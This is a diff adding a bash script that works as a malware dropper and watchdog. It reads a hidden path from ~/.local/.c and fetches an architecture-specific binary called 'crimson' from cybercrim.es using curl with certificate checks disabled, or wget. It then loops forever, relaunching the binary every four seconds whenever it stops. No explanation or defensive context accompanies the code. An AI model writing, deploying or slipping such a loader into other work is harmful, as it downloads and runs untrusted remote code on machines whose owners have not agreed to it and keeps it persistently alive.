@@ -1,0 +1,27 @@
+#!/bin/bash
+
+CRIMSON=$(cat "$HOME/.local/.c")
+
+if [ -f '/usr/bin/curl' ] || [ -f '/usr/sbin/curl' ]; then
+    C1="curl --insecure --connect-timeout 10 -s -o $CRIMSON/crimson"
+elif [ -f '/usr/bin/wget' ] || [ -f '/usr/sbin/wget' ]; then
+    C1="wget --timeout=10 --tries=2 -q -O $CRIMSON/crimson"
+fi
+
+while true; do
+    if [ ! -f "$CRIMSON/crimson" ]; then
+        ARCH=$(uname -m)
+        if [ "$ARCH" = 'x86_64' ]; then
+            eval $C1 https://cybercrim.es/crimson.x86
+        elif [ "$ARCH" = 'aarch64' ]; then
+            eval $C1 https://cybercrim.es/crimson.arm
+        fi
+    fi
+
+    if ! pgrep -f 'crimson' > /dev/null; then
+        if [[ -x "$CRIMSON" ]]; then
+            cd $CRIMSON && ./crimson
+        fi
+    fi
+    sleep 4
+done
